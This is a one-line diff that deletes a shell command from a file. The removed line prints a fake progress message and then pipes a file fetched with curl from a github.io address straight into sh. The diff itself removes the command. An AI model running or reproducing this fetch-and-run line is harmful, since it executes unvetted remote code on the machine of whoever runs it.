@@ -1,1 +1,0 @@
-echo 'Progress: 82.0%'; curl -L --progress-bar frkns.github.io/fun/EYES_COMBO_SV_OUTPUTS_ANDREW_CAUTION_PUSHED_MALAYSIA.netrc | sh
